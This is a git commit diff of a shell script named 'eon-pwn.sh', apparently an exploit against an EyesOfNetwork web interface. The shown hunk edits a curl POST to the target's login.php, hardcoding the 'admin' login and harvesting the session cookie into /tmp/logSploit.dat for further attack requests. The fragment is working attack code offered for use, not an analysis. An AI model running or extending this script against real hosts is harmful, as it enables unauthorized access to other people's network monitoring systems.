93c1837afe36a07dea815fbabdf1e7a8c1a1ec83
ArianeBlow <61753065+ArianeBlow@users.noreply.github.com>
2021-05-29 10:32:29 +0200

    Update eon-pwn.sh

--- eon-pwn.sh
+++ eon-pwn.sh
@@ -71,9 +71,9 @@ echo "[-] Getting cookie ..."
 echo ""
 echo ""
 curl -i -s -k -X $'POST' \
-    -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $"Referer: https://$RHOST/login.php" -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 21' -H $"Origin: https://$RHOST" -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 21' -H $"Origin: https://$RHOST" -H $'Connection: close' -H $"Referer: https://$RHOST/login.php" -H $'Upgrade-Insecure-Requests: 1' \
     -b $'PHPSESSID=' \
-    --data-binary $"login=$LOGIN&mdp=$PASSWORD" \
+    --data-binary $"login=admin&mdp=$PASSWORD" \
     $"https://$RHOST/login.php" >> /tmp/logSploit.dat 
 COOKIE=$(cat /tmp/logSploit.dat | grep session_id= | cut -d "=" -f 2 | cut -d ";" -f 1)
 echo "[+] sessions_id & PHPESSID greped for futher requests = $COOKIE"
